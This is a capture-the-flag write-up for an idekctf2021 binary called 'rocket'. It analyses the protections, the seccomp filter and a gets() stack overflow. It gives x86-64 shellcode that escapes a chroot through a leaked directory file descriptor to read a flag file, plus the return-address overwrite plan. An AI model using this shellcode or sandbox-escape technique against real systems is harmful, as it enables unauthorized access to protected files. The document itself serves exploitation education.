# handout

**This challenge will only work remote because it requires a very specific 
filesystem setup that I don't feel like emulating right now**

## Tags

- x86-64
- seccomp
- stack buffer overflow
- idekctf2021

## Intro

A challenge from idekctf2021. This is a binary that uses `seccomp` to filter
allowed syscalls. This particular binary also `chroot`'s to a directory in tmp (most likely to prevent writing to files that get executed). We will need to analyze the sandbox environment to determine what is possible.

## Analysis

First we need to determine what protections we are dealing with. We will use `checksec` for this.

    $ checksec rocket
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments

This is an `x86-64` ELF binary with seemingly no protections enabled. Let's use `ghidra` to examine the binary. The bug is very obvious

    printf("Here is a gift for your journey:%p\n",local_828);
    gets(local_828);
    install_syscall_filter();

This is a stack buffer overflow with `seccomp` filters enabled.

## Solution

First we need to determine which syscalls we are allowed to execute. To do this we can use [seccomp-tools](https://github.com/david942j/seccomp-tools). Run

    $ seccomp-tools dump ./rocket

Provide input so that the `seccomp` filters are submitted. The results look like

    $ seccomp-tools dump ./rocket
    Creating a jail at `/tmp/ccRUAB`.
    Here is a gift for your journey:0x7ffcfdb72c00
    hello world
     line  CODE  JT   JF      K
    =================================
     0000: 0x20 0x00 0x00 0x00000004  A = arch
     0001: 0x15 0x01 0x00 0xc000003e  if (A == ARCH_X86_64) goto 0003
     0002: 0x06 0x00 0x00 0x00000000  return KILL
     0003: 0x20 0x00 0x00 0x00000000  A = sys_number
     0004: 0x15 0x00 0x01 0x0000000f  if (A != rt_sigreturn) goto 0006
     0005: 0x06 0x00 0x00 0x7fff0000  return ALLOW
     0006: 0x15 0x00 0x01 0x00000101  if (A != openat) goto 0008
     0007: 0x06 0x00 0x00 0x7fff0000  return ALLOW
     0008: 0x15 0x00 0x01 0x00000001  if (A != write) goto 0010
     0009: 0x06 0x00 0x00 0x7fff0000  return ALLOW
     0010: 0x15 0x00 0x01 0x00000028  if (A != sendfile) goto 0012
     0011: 0x06 0x00 0x00 0x7fff0000  return ALLOW
     0012: 0x15 0x00 0x01 0x00000000  if (A != read) goto 0014
     0013: 0x06 0x00 0x00 0x7fff0000  return ALLOW
     0014: 0x15 0x00 0x01 0x0000003c  if (A != exit) goto 0016
     0015: 0x06 0x00 0x00 0x7fff0000  return ALLOW
     0016: 0x15 0x00 0x01 0x00000048  if (A != fcntl) goto 0018
     0017: 0x06 0x00 0x00 0x7fff0000  return ALLOW
     0018: 0x06 0x00 0x00 0x00000000  return KILL

We can only use the following syscalls

    sigreturn
    openat
    write
    sendfile
    read
    exit
    fcntl

A look at the binary in `ghidra` shows that it opens the `/tmp` directory
before calling `chroot` and never closes the `fd`. We can use our shellcode to call `openat` and open the flag file. Additonally the program opens several random file descriptors. To overcome this we will have our shellcode loop over every possible fd and attempt to open the flag file. When the `openat` call succeeds we break the loop. Here is our shellcode

        xor rdi, rdi     # get rdi to 3 initially
        inc rdi
        inc rdi
        inc rdi

    try_again:
        inc rdi               # increment test fd
        lea rsi, [rip + flag]
        mov rdx, O_RDONLY
        mov rax, SYS_openat
        syscall
        test rax, rax
        js try_again

    win:
        push rax            # read flag into memory
        pop rdi
        mov rsi, PTR_ADDR    # this will be the addr of our buffer - 30
        mov rdx, 0x30
        mov rax, SYS_read
        syscall

        xor rdi, rdi          # write flag to STDOUT
        inc rdi
        mov rax, SYS_write
        syscall

    flag:
        .ascii "../flag.txt"

To execute our shellcode we will write our shellcode first and then overwrite the return address on the stack with the address of our shellcode.
